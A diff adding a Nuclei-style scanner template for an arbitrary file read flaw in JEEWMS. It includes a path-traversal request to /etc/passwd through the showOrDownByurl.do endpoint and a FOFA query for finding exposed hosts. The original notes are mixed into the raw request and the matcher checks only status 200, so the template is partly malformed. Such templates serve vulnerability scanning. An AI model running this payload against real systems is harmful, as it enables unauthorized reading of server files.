@@ -1,0 +1,34 @@
+id: poc-gntocam8gaipz4gi
+info:
+  name: JEEWMS存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gntocam8gaipz4gi'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gntocam8gaipz4gi
+    fofa: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"或者fid="cC2r/XQpJXcYiYFHOc77bg=="
+http:
+- raw:
+  - 'GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
